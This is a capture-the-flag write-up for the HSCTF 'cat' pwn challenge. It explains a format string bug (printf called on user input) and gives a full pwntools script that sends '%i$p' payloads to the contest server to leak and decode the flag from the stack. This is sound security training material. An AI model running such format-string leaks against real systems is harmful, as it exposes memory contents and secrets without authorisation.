# Cat

## Description

pwn/cat (by hmmm) | 435 points

Cat is the true standard text editor.

`nc cat.hsctf.com 1337`

Downloads: [chall](https://hsctf-10-resources.storage.googleapis.com/uploads/11c5a2b8fd9941416b85a8202846024fb0e798db6ba25bc011444263df821ec9/chall), [chall.c](https://hsctf-10-resources.storage.googleapis.com/uploads/b8076a4583e1fac9195875c81c267779b15655f3250d8382ae9d214b28bb6be7/chall.c)

## Analysis

Program opens the `flag.txt`, reads and writes into `flag` buffer. After that `input` buffer is defined which simply echos the input. 

[Vulnerability](https://owasp.org/www-community/attacks/Format_string_attack) = `printf(buffer);` 

## Solution

I used the [***script***](https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/intigriti_22/pwn/search_engine/exploit.py) from [***CryptoCat***](https://www.youtube.com/watch?v=BekVaShD9HE) writeup video which fuzzes the (similar) program, decodes value and builds the flag.

```py
from pwn import *

context.log_level = 'info'

flag = ''

# Let's fuzz x values
for i in range(8, 20):
    try:
        # io = process('./chall', level='warn') # Local
        io = remote('cat.hsctf.com', 1337, level='warn') # Connect to server

        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendline(f'%{i}$p'.encode())
        
        # Receive the response (leaked address followed by '.' in this case)
        result = io.recvline()

        # Ignore null values
        if b'nil' in result: continue
        
        print(f'{i}: {result}')
        try:
            # Decode, reverse endianess and print
            decoded = unhex(result.strip().decode()[2:])
            reversed_hex = decoded[::-1]
            print(str(reversed_hex))
            # Build up flag
            flag += reversed_hex.decode()
        except BaseException:
            ...

        io.close()
    except EOFError:
        io.close()

# Print and close
info(flag)
``` 